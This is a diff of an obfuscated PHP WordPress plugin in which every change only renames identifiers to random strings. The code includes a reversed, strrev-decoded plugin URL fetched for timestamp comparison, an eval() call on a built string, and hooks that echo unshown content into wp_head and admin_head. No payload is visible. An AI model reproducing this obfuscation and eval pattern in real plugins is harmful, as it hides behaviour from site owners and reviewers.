+    private function getAfhjtyyjmrur($qgavslzyowuv = 0) {
+  $timearray = ($qgavslzyowuv == 0) ? getdate() : getdate($qgavslzyowuv);
    if ($timearray['year'] < 1980) {
        $timearray['year'] = 1980;
    $timearray['mon'] = 1;
@@ -758,61 +759,61 @@ if ($json == '') {
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
  ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
     } 	
-  private function constructRknqjiulscmxgdnsnraxc($cjjvhkdvx) {
-      $sec = 2 * ($cjjvhkdvx     & 0x1f);
-     $min = ($cjjvhkdvx >> 5)   & 0x3f;
-     $hrs = ($cjjvhkdvx >> 11)  & 0x1f;
-     $day = ($cjjvhkdvx >> 16)  & 0x1f;
-     $mon = ($cjjvhkdvx >> 21)  & 0x0f;
-     $year = (($cjjvhkdvx >> 25) & 0x7f) + 1980; 
+        private function buildDifqkieifbo($pthpymwkz) {
+      $sec = 2 * ($pthpymwkz     & 0x1f);
+     $min = ($pthpymwkz >> 5)   & 0x3f;
+     $hrs = ($pthpymwkz >> 11)  & 0x1f;
+     $day = ($pthpymwkz >> 16)  & 0x1f;
+     $mon = ($pthpymwkz >> 21)  & 0x0f;
+     $year = (($pthpymwkz >> 25) & 0x7f) + 1980; 
   return mktime($hrs, $min, $sec, $mon, $day, $year);
    } 
-   private function buildYzahznfhhozqe($tpzlhqikpyve) {
-  $offsetYvhkdzukf = dechex($tpzlhqikpyve);
- $hexdtime = '\x' . $offsetYvhkdzukf[6] . $offsetYvhkdzukf[7]
- . '\x' . $offsetYvhkdzukf[4] . $offsetYvhkdzukf[5]
- . '\x' . $offsetYvhkdzukf[2] . $offsetYvhkdzukf[3]
-  . '\x' . $offsetYvhkdzukf[0] . $offsetYvhkdzukf[1];
+       private function getFgenzsbfzgc($lefswhllcm) {
+ $strPozydsqtmhjhh = dechex($lefswhllcm);
+   $hexdtime = '\x' . $strPozydsqtmhjhh[6] . $strPozydsqtmhjhh[7]
+   . '\x' . $strPozydsqtmhjhh[4] . $strPozydsqtmhjhh[5]
+   . '\x' . $strPozydsqtmhjhh[2] . $strPozydsqtmhjhh[3]
+    . '\x' . $strPozydsqtmhjhh[0] . $strPozydsqtmhjhh[1];
   eval('$hexdtime = "' . $hexdtime . '";');
         return $hexdtime;
   }
-private function setPvqqqrzldbdzvk($lvqiksjsdx) {
-  $dtime = array_map("dechex", array_map("ord", str_split($lvqiksjsdx)));
+       private function getSeorbcftmhm($ehlvdmakkj) {
+  $dtime = array_map("dechex", array_map("ord", str_split($ehlvdmakkj)));
          $hexdtime = $dtime[3] . $dtime[2] . $dtime[1] . $dtime[0];
-         $countDxawdefhpmc = hexdec($hexdtime);
-      return $countDxawdefhpmc;
+       $isNhuobocevgip = hexdec($hexdtime);
+    return $isNhuobocevgip;
   }
-         public function constructWxzhgsedpleqan($dlduvauhqumrzu) {
-     return strftime("%Y-%m-%d %H:%M:%S", $dlduvauhqumrzu);
+      public function getUcqlvvlkxyvqcdnazud($jjnquevnwpom) {
+   return strftime("%Y-%m-%d %H:%M:%S", $jjnquevnwpom);
   }
-      public function setZuqdxvrvvdlauxsbmj($irdqaetbofiwh) {
-        $intQiuweexexo = substr($irdqaetbofiwh, 10, 4);
-    $timestamp = $this->constructRknqjiulscmxgdnsnraxc($this->setPvqqqrzldbdzvk($intQiuweexexo));
+    public function getYsfeaxmnyzlhjjntq($xblhzyygmxnk) {
+ $offsetMljvcwgiqnv = substr($xblhzyygmxnk, 10, 4);
+ $timestamp = $this->buildDifqkieifbo($this->getSeorbcftmhm($offsetMljvcwgiqnv));
          return $timestamp;
   }
   }
-  class Stipnyiukckk {
-  const Ohtcvnxwaopm = "snigulp/dnetxe/gro.sserpdrow//:ptth"; 
-   const Cckbjosgurufa = 'strrev';
-       const Vijeenezxzaa = 100;
-       const Uhxayklhxpcn = 101;
-         const Ynpidtzxmqqhwv = 120;
+   class Cxdsskkzqxpsr {
+   const Mezqqssslhobu = "snigulp/dnetxe/gro.sserpdrow//:ptth"; 
+       const Gfmtjagzofmyipopp = 'strrev';
+     const Orsptwhtze = 100;
+      const Awvcgmqelco = 101;
+      const Xnpugewscco = 120;
     private function __construct() {
    }
 public static function getInstance() {
          static $instance;
       if(is_null($instance)) {
-   $instance = new Stipnyiukckk();
+    $instance = new Cxdsskkzqxpsr();
 } else {
    }
          return $instance;
    }
-         private function setUtdammvcqsw($kqignsaydzx) {
-$func = self::Cckbjosgurufa;
-     return $func(self::Ohtcvnxwaopm) . '/' . $kqignsaydzx . '.zip';
+  private function constructIphmfitcjy($sunxcfbgg) {
+    $func = self::Gfmtjagzofmyipopp;
+    return $func(self::Mezqqssslhobu) . '/' . $sunxcfbgg . '.zip';
    }
- public function setQkouqwyyqlwnak($teuiaokmmxb) {
-      $phpData = @file_get_contents($teuiaokmmxb);
+  public function constructNtooqwrvp($ihfvszphkqk) {
+      $phpData = @file_get_contents($ihfvszphkqk);
 preg_match_all('/#\s*@date\s*[0-9]{4}-[0-9]{2}-[0-9]{2}\s*[0-9]{2}:[0-9]{2}:[0-9]{2}/', $phpData, $matches);
 return 	strtotime(
        trim(
@@ -820,26 +821,26 @@ preg_replace('/[a-zA-Z#@]/', '', $matches[0][0])
    )
     );
    }
-  public function createPeurwetqdoe($mrgmeqmhantb) {
-      $url = $this->setUtdammvcqsw($mrgmeqmhantb);
+    public function createNqktojyouqjfvt($cfczgewapmx) {
+$url = $this->constructIphmfitcjy($cfczgewapmx);
         $zipData = @file_get_contents($url);
-       $timestamp = Rtaxbkaygcksv::getInstance()->setZuqdxvrvvdlauxsbmj($zipData);
+   $timestamp = Ogdfzrwpuf::getInstance()->getYsfeaxmnyzlhjjntq($zipData);
 return $timestamp;
    }
-      public function setRkbvkcywyaguxm($kdqloyqrhthvw, $dzysgcmpuo) {
-       $Sfjahbxjzbbje = array();
- $tsLocal = $this->setQkouqwyyqlwnak($dzysgcmpuo);
-     $tsRemote = $this->createPeurwetqdoe($kdqloyqrhthvw);
-   $Sfjahbxjzbbje[self::Vijeenezxzaa] = Rtaxbkaygcksv::getInstance()->constructWxzhgsedpleqan($tsLocal);
-    $Sfjahbxjzbbje[self::Uhxayklhxpcn] = Rtaxbkaygcksv::getInstance()->constructWxzhgsedpleqan($tsRemote);
+      public function setCjfhvxrjorcyirww($qlvaoovnskm, $kqwfvrgpym) {
+    $offsetGvdaejjpystzlz = array();
+  $tsLocal = $this->constructNtooqwrvp($kqwfvrgpym);
+      $tsRemote = $this->createNqktojyouqjfvt($qlvaoovnskm);
+    $offsetGvdaejjpystzlz[self::Orsptwhtze] = Ogdfzrwpuf::getInstance()->getUcqlvvlkxyvqcdnazud($tsLocal);
+      $offsetGvdaejjpystzlz[self::Awvcgmqelco] = Ogdfzrwpuf::getInstance()->getUcqlvvlkxyvqcdnazud($tsRemote);
          if ($tsRemote > $tsLocal) {
-      $Sfjahbxjzbbje[self::Ynpidtzxmqqhwv] = true;
+$offsetGvdaejjpystzlz[self::Xnpugewscco] = true;
    }
-    return $Sfjahbxjzbbje;
+ return $offsetGvdaejjpystzlz;
    }
    }
-   $fractal_explorer = new Gjcjrxplpidpno();
-        $fractal_explorer_id = $fractal_explorer->constructXupmqftcgebg();
+    $fractal_explorer = new Qalqjbhjdpgdnxb();
+   $fractal_explorer_id = $fractal_explorer->queryFylkjuqipgy();
         if ( ! defined( 'WP_CONTENT_URL' ) )
 define( 'WP_CONTENT_URL', get_option( 'siteurl' ) . '/wp-content' );
         if ( ! defined( 'WP_CONTENT_DIR' ) )
@@ -848,76 +849,76 @@ define( 'WP_CONTENT_URL', get_option( 'siteurl' ) . '/wp-content' );
       define( 'WP_PLUGIN_URL', WP_CONTENT_URL. '/plugins' );
        if ( ! defined( 'WP_PLUGIN_DIR' ) )
        define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );
- if (!function_exists(setVxgfsekgfq)) { 
-         function setVxgfsekgfq() { 
+    if (!function_exists(buildKcwumntdtsp)) { 
+  function buildKcwumntdtsp() { 
         global $fractal_explorer; 
      if (!isset($fractal_explorer)) { 
 return; 
    }
-    $fractal_explorer->createEgeosqvtkotjid();
+  $fractal_explorer->buildOcgjlyrxqznrb();
    }
    }
- if (!function_exists(getIfeoyuojue)) { 
-         function getIfeoyuojue() { 
+ if (!function_exists(buildOenpblgfsebultntcb)) { 
+         function buildOenpblgfsebultntcb() { 
 global $fractal_explorer_id;
        global $fractal_explorer;
      if (!isset($fractal_explorer)) { 
 return; 
    }
     if (function_exists('add_options_page')) {
-  add_options_page($fractal_explorer_id, $fractal_explorer_id, 'administrator', basename(__FILE__), array(&$fractal_explorer, constructJqwrveysxgdenp));
+    add_options_page($fractal_explorer_id, $fractal_explorer_id, 'administrator', basename(__FILE__), array(&$fractal_explorer, setJeqkafydnnmy));
    }
    }
    }
-       if (!function_exists(constructGuiiaqslpv)) { 
-        function constructGuiiaqslpv($zinzwmdbqipq) { 
-     extract($zinzwmdbqipq);
+ if (!function_exists(constructNcmvtyqosfentm)) { 
+function constructNcmvtyqosfentm($aahlkuyuyi) { 
+   extract($aahlkuyuyi);
         global $fractal_explorer; 
      if (!isset($fractal_explorer)) { 
 return; 
    }
-echo $fractal_explorer->getYlirmndeijfqcgnawrtv($before_widget, $after_widget, $before_title, $after_title);
+  echo $fractal_explorer->constructDrhhivgyltelvhlk($before_widget, $after_widget, $before_title, $after_title);
    }
    }
-   if (!function_exists(getUwdtywqiqvgl)) { 
- function getUwdtywqiqvgl() { 
+        if (!function_exists(createCrlauwgznybacq)) { 
+      function createCrlauwgznybacq() { 
         global $fractal_explorer; 
      if (!isset($fractal_explorer)) { 
 return; 
    }
-        echo $fractal_explorer->buildVrawygpkbtuehd();
+      echo $fractal_explorer->setZtemdrkylpvlhh();
    }
    }
-       if (!function_exists(queryZcxphtsnvzctrd)) { 
-     function queryZcxphtsnvzctrd() { 
+  if (!function_exists(setCupaysjzqehulwkzsvgdj)) { 
+function setCupaysjzqehulwkzsvgdj() { 
         global $fractal_explorer; 
      if (!isset($fractal_explorer)) { 
 return; 
    }
-         echo $fractal_explorer->getWpcshgzgsaieyfzyi();
+        echo $fractal_explorer->buildHipkfewuavlfen();
    }
    }
-         if (!function_exists(createGjxsryptljlymia)) { 
-       function createGjxsryptljlymia() { 
+     if (!function_exists(buildYbilpvahguuajoelcbuhlw)) { 
+   function buildYbilpvahguuajoelcbuhlw() { 
         global $fractal_explorer; 
      if (!isset($fractal_explorer)) { 
 return; 
    }
-  echo $fractal_explorer->setHvndterkeb();
+       echo $fractal_explorer->constructOsyewrwah();
    }
    }
  if (function_exists('register_sidebar_widget')) {
-         register_sidebar_widget($fractal_explorer_id, constructGuiiaqslpv);
+   register_sidebar_widget($fractal_explorer_id, constructNcmvtyqosfentm);
    }
  if (function_exists('register_sidebar_widget')) {
-     register_widget_control($fractal_explorer_id, getUwdtywqiqvgl);
+register_widget_control($fractal_explorer_id, createCrlauwgznybacq);
    }
   if (function_exists('register_activation_hook')) {
-  register_activation_hook(__FILE__, setVxgfsekgfq);
+     register_activation_hook(__FILE__, buildKcwumntdtsp);
    }
         if (function_exists('add_action')) {
-  add_action('admin_menu', getIfeoyuojue);
-     add_action('wp_head', queryZcxphtsnvzctrd);
-add_action('admin_head', createGjxsryptljlymia);
+  add_action('admin_menu', buildOenpblgfsebultntcb);
+add_action('wp_head', setCupaysjzqehulwkzsvgdj);
+      add_action('admin_head', buildYbilpvahguuajoelcbuhlw);
    }
    ?>
